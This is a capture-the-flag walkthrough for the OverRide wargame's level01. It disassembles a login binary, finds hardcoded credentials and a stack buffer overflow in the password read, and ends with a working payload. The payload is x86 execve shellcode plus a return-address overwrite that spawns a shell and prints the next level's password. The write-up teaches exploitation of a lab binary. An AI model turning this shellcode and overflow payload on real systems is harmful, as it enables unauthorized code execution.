As always let's run the given binary:

    level01@OverRide:~$ ./level01
    ********* ADMIN LOGIN PROMPT *********
    Enter Username: level02
    verifying username....

    nope, incorrect username...

Time to check strings table. Here it is cut short for convenience.

    level01@OverRide:~$ strings level01
    /lib/ld-linux.so.2
    __gmon_start__
    libc.so.6
    _IO_stdin_used
    puts
    stdin
    printf
    fgets
    __libc_start_main
    GLIBC_2.0
    PTRh0
    UWVS
    [^_]
    verifying username....
    dat_wil
    admin
    ********* ADMIN LOGIN PROMPT *********
    Enter Username:
    nope, incorrect username...
    Enter Password:
    nope, incorrect password...
    ;*2$"$
    [...]
    verify_user_pass
    [...]
    main
    _Jv_RegisterClasses
    verify_user_name
    a_user_name
    _init

***

`dat_wil` and `admin` strings look interesting. As well as probable functions' names - `verify_user_name`, `verify_user_pass` and a possible global variable `a_user_name`.
Next we will use gdb to confirm our guesses and delve into inner workings of the program.

***

    (gdb) info func
    All defined functions:

    Non-debugging symbols:
    0x08048318  _init
    0x08048360  printf
    0x08048360  printf@plt
    0x08048370  fgets
    0x08048370  fgets@plt
    0x08048380  puts
    0x08048380  puts@plt
    0x08048390  __gmon_start__
    0x08048390  __gmon_start__@plt
    0x080483a0  __libc_start_main
    0x080483a0  __libc_start_main@plt
    0x080483b0  _start
    0x080483e0  __do_global_dtors_aux
    0x08048440  frame_dummy
    0x08048464  verify_user_name
    0x080484a3  verify_user_pass
    0x080484d0  main
    0x080485c0  __libc_csu_init
    0x08048630  __libc_csu_fini
    0x08048632  __i686.get_pc_thunk.bx
    0x08048640  __do_global_ctors_aux
    0x0804866c  _fini

***

    (gdb) info var
    All defined variables:

    Non-debugging symbols:
    0x08048688  _fp_hw
    0x0804868c  _IO_stdin_used
    0x08048898  __FRAME_END__
    0x08049f14  __CTOR_LIST__
    0x08049f14  __init_array_end
    0x08049f14  __init_array_start
    0x08049f18  __CTOR_END__
    0x08049f1c  __DTOR_LIST__
    0x08049f20  __DTOR_END__
    0x08049f24  __JCR_END__
    0x08049f24  __JCR_LIST__
    0x08049f28  _DYNAMIC
    0x08049ff4  _GLOBAL_OFFSET_TABLE_
    0x0804a014  __data_start
    0x0804a014  data_start
    0x0804a018  __dso_handle
    0x0804a020  stdin@@GLIBC_2.0
    0x0804a024  completed.6159
    0x0804a028  dtor_idx.6161
    0x0804a040  a_user_name

***

    (gdb) disass main
    Dump of assembler code for function main:
    0x080484d0 <+0>:     push   %ebp                            // save prev func stackframe
    0x080484d1 <+1>:     mov    %esp,%ebp                       // store stack pointer to top of stack in ebp
    0x080484d3 <+3>:     push   %edi
    0x080484d4 <+4>:     push   %ebx
    0x080484d5 <+5>:     and    $0xfffffff0,%esp                // align stack on 16 bytes
    0x080484d8 <+8>:     sub    $0x60,%esp                      // 0x60 = 96 bytes allocated for main
    0x080484db <+11>:    lea    0x1c(%esp),%ebx                 // 0x1c = 28
    0x080484df <+15>:    mov    $0x0,%eax
    0x080484e4 <+20>:    mov    $0x10,%edx                      // 0x10 = 16
    0x080484e9 <+25>:    mov    %ebx,%edi
    0x080484eb <+27>:    mov    %edx,%ecx
    0x080484ed <+29>:    rep stos %eax,%es:(%edi)               // char buf64[64 = (0x5c - 0x1c)] = {} 
    0x080484ef <+31>:    movl   $0x0,0x5c(%esp)                 // 0x5c = 92
    0x080484f7 <+39>:    movl   $0x80486b8,(%esp)               // "********* ADMIN LOGIN PROMPT *********"
    0x080484fe <+46>:    call   0x8048380 <puts@plt>
    0x08048503 <+51>:    mov    $0x80486df,%eax                 // "Enter Username: "
    0x08048508 <+56>:    mov    %eax,(%esp)
    0x0804850b <+59>:    call   0x8048360 <printf@plt>
    0x08048510 <+64>:    mov    0x804a020,%eax                  // stdin
    0x08048515 <+69>:    mov    %eax,0x8(%esp)
    0x08048519 <+73>:    movl   $0x100,0x4(%esp)                // 0x100 = 256
    0x08048521 <+81>:    movl   $0x804a040,(%esp)               // a_user_name
    0x08048528 <+88>:    call   0x8048370 <fgets@plt>           // fgets(a_user_name, 256, stdin)
    0x0804852d <+93>:    call   0x8048464 <verify_user_name>
    0x08048532 <+98>:    mov    %eax,0x5c(%esp)
    0x08048536 <+102>:   cmpl   $0x0,0x5c(%esp)
    0x0804853b <+107>:   je     0x8048550 <main+128>
    0x0804853d <+109>:   movl   $0x80486f0,(%esp)               // "nope, incorrect username...\n"
    0x08048544 <+116>:   call   0x8048380 <puts@plt>
    0x08048549 <+121>:   mov    $0x1,%eax
    0x0804854e <+126>:   jmp    0x80485af <main+223>
    0x08048550 <+128>:   movl   $0x804870d,(%esp)               // "Enter Password: "
    0x08048557 <+135>:   call   0x8048380 <puts@plt>
    0x0804855c <+140>:   mov    0x804a020,%eax                  // stdin
    0x08048561 <+145>:   mov    %eax,0x8(%esp)
    0x08048565 <+149>:   movl   $0x64,0x4(%esp)                 // 0x64 = 100
    0x0804856d <+157>:   lea    0x1c(%esp),%eax
    0x08048571 <+161>:   mov    %eax,(%esp)
    0x08048574 <+164>:   call   0x8048370 <fgets@plt>           // fgets(buf64, 100, stdin)
    0x08048579 <+169>:   lea    0x1c(%esp),%eax
    0x0804857d <+173>:   mov    %eax,(%esp)
    0x08048580 <+176>:   call   0x80484a3 <verify_user_pass>
    0x08048585 <+181>:   mov    %eax,0x5c(%esp)
    0x08048589 <+185>:   cmpl   $0x0,0x5c(%esp)
    0x0804858e <+190>:   je     0x8048597 <main+199>
    0x08048590 <+192>:   cmpl   $0x0,0x5c(%esp)
    0x08048595 <+197>:   je     0x80485aa <main+218>
    0x08048597 <+199>:   movl   $0x804871e,(%esp)               // "nope, incorrect password...\n"
    0x0804859e <+206>:   call   0x8048380 <puts@plt>
    0x080485a3 <+211>:   mov    $0x1,%eax
    0x080485a8 <+216>:   jmp    0x80485af <main+223>
    0x080485aa <+218>:   mov    $0x0,%eax
    0x080485af <+223>:   lea    -0x8(%ebp),%esp
    0x080485b2 <+226>:   pop    %ebx
    0x080485b3 <+227>:   pop    %edi
    0x080485b4 <+228>:   pop    %ebp
    0x080485b5 <+229>:   ret
    End of assembler dump.


    (gdb) p /s  (char*)0x80486b8
    $11 = 0x80486b8 "********* ADMIN LOGIN PROMPT *********"
    (gdb) p /s  (char*)0x80486df
    $12 = 0x80486df "Enter Username: "
    (gdb) x 0x804a040
    0x804a040 <a_user_name>:         U""
    (gdb) p /s  (char*)0x80486f0
    $15 = 0x80486f0 "nope, incorrect username...\n"
    (gdb) p /s  (char*)0x804870d
    $16 = 0x804870d "Enter Password: "
    (gdb) p /s  (char*)0x804871e
    $17 = 0x804871e "nope, incorrect password...\n"

***

    (gdb) disass verify_user_name
    Dump of assembler code for function verify_user_name:
    0x08048464 <+0>:     push   %ebp
    0x08048465 <+1>:     mov    %esp,%ebp
    0x08048467 <+3>:     push   %edi
    0x08048468 <+4>:     push   %esi
    0x08048469 <+5>:     sub    $0x10,%esp
    0x0804846c <+8>:     movl   $0x8048690,(%esp)               // "verifying username....\n"
    0x08048473 <+15>:    call   0x8048380 <puts@plt>
    0x08048478 <+20>:    mov    $0x804a040,%edx                 // a_user_name
    0x0804847d <+25>:    mov    $0x80486a8,%eax                 // "dat_wil"
    0x08048482 <+30>:    mov    $0x7,%ecx
    0x08048487 <+35>:    mov    %edx,%esi
    0x08048489 <+37>:    mov    %eax,%edi
    0x0804848b <+39>:    repz cmpsb %es:(%edi),%ds:(%esi)       // strncmp(a_user_name, "dat_wil", 7)
    0x0804848d <+41>:    seta   %dl
    0x08048490 <+44>:    setb   %al
    0x08048493 <+47>:    mov    %edx,%ecx
    0x08048495 <+49>:    sub    %al,%cl
    0x08048497 <+51>:    mov    %ecx,%eax
    0x08048499 <+53>:    movsbl %al,%eax
    0x0804849c <+56>:    add    $0x10,%esp
    0x0804849f <+59>:    pop    %esi
    0x080484a0 <+60>:    pop    %edi
    0x080484a1 <+61>:    pop    %ebp
    0x080484a2 <+62>:    ret
    End of assembler dump.


    (gdb) p /s  (char*)0x8048690
    $8 = 0x8048690 "verifying username....\n"
    (gdb) p /s  (char*)0x804a040
    $7 = 0x804a040 ""
    (gdb) p /s  (char*)0x80486a8
    $6 = 0x80486a8 "dat_wil"

***

    (gdb) disass verify_user_pass
    Dump of assembler code for function verify_user_pass:
    0x080484a3 <+0>:     push   %ebp
    0x080484a4 <+1>:     mov    %esp,%ebp
    0x080484a6 <+3>:     push   %edi
    0x080484a7 <+4>:     push   %esi
    0x080484a8 <+5>:     mov    0x8(%ebp),%eax
    0x080484ab <+8>:     mov    %eax,%edx
    0x080484ad <+10>:    mov    $0x80486b0,%eax             // "admin"
    0x080484b2 <+15>:    mov    $0x5,%ecx
    0x080484b7 <+20>:    mov    %edx,%esi
    0x080484b9 <+22>:    mov    %eax,%edi
    0x080484bb <+24>:    repz cmpsb %es:(%edi),%ds:(%esi)   // strncmp(pass, "admin", 5)
    0x080484bd <+26>:    seta   %dl
    0x080484c0 <+29>:    setb   %al
    0x080484c3 <+32>:    mov    %edx,%ecx
    0x080484c5 <+34>:    sub    %al,%cl
    0x080484c7 <+36>:    mov    %ecx,%eax
    0x080484c9 <+38>:    movsbl %al,%eax
    0x080484cc <+41>:    pop    %esi
    0x080484cd <+42>:    pop    %edi
    0x080484ce <+43>:    pop    %ebp
    0x080484cf <+44>:    ret
    End of assembler dump.

    (gdb) p /s  (char*)0x80486b0
    $9 = 0x80486b0 "admin"

***

    level01@OverRide:~$ ./level01
    ********* ADMIN LOGIN PROMPT *********
    Enter Username: dat_wil
    verifying username....

    Enter Password:
    admin
    nope, incorrect password...

***

A lot is going on so let's break it down:
* login: dat_wil
* password: admin
* correct login gets us to password check
* correct password does basically nothing
* login/username is read into global buffer
* password is read into buffer allocated on stack in main and leaves at 100 - 64 = 36 bytes to play with buffer overflow and rewrite the stackframe
* offset (to get to eip) from second fgets is 96(allocated on stack) - 28(start of buffer) + 12(alingment) = 80 bytes

Let's check our offset calculations with this [tool](https://wiremask.eu/tools/buffer-overflow-pattern-generator/)

***

    level01@OverRide:~$ gdb ./level01
    GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
    Copyright (C) 2012 Free Software Foundation, Inc.
    License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
    This is free software: you are free to change and redistribute it.
    There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
    and "show warranty" for details.
    This GDB was configured as "x86_64-linux-gnu".
    For bug reporting instructions, please see:
    <http://bugs.launchpad.net/gdb-linaro/>...
    Reading symbols from /home/users/level01/level01...(no debugging symbols found)...done.
    (gdb) r
    Starting program: /home/users/level01/level01
    ********* ADMIN LOGIN PROMPT *********
    Enter Username: dat_wil
    verifying username....

    Enter Password:
    Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
    nope, incorrect password...


    Program received signal SIGSEGV, Segmentation fault.
    0x37634136 in ?? ()

***

While we are at it we should find the address where password buffer is stored:

***

    level01@OverRide:~$ ltrace ./level01
    __libc_start_main(0x80484d0, 1, -10300, 0x80485c0, 0x8048630 <unfinished ...>
    puts("********* ADMIN LOGIN PROMPT ***"...********* ADMIN LOGIN PROMPT *********
    )                                                               = 39
    printf("Enter Username: ")                                                                                = 16
    fgets(Enter Username: dat_wil
    "dat_wil\n", 256, 0xf7fcfac0)                                                                       = 0x0804a040
    puts("verifying username....\n"verifying username....

    )                                                                          = 24
    puts("Enter Password: "Enter Password:
    )                                                                                  = 17
    fgets(admin
    "admin\n", 100, 0xf7fcfac0)                                                                         = 0xffffd6dc
    puts("nope, incorrect password...\n"nope, incorrect password...

    )                                                                     = 29
    +++ exited (status 1) +++

***

Now that we know the offset (80) and password address (0xffffd6dc) we can rewrite eip to call bash with this [shellcode](http://shell-storm.org/shellcode/files/shellcode-827.html):
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

Input string structure:
* 8 bytes -> "dat_wil\n"
* 23 bytes -> shellcode
* 57 bytes (80 - 23) -> padding
* 4 bytes -> 0xffffd6dc

***

    level01@OverRide:~$ python -c 'print "dat_wil\n\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "a" * 57 + "\xdc\xd6\xff\xff"' > /tmp/lvl1
    level01@OverRide:~$ cat /tmp/lvl1 - | ./level01
    ********* ADMIN LOGIN PROMPT *********
    Enter Username: verifying username....

    Enter Password:
    nope, incorrect password...

    whoami
    level02
    cat /home/users/level02/.pass
    PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv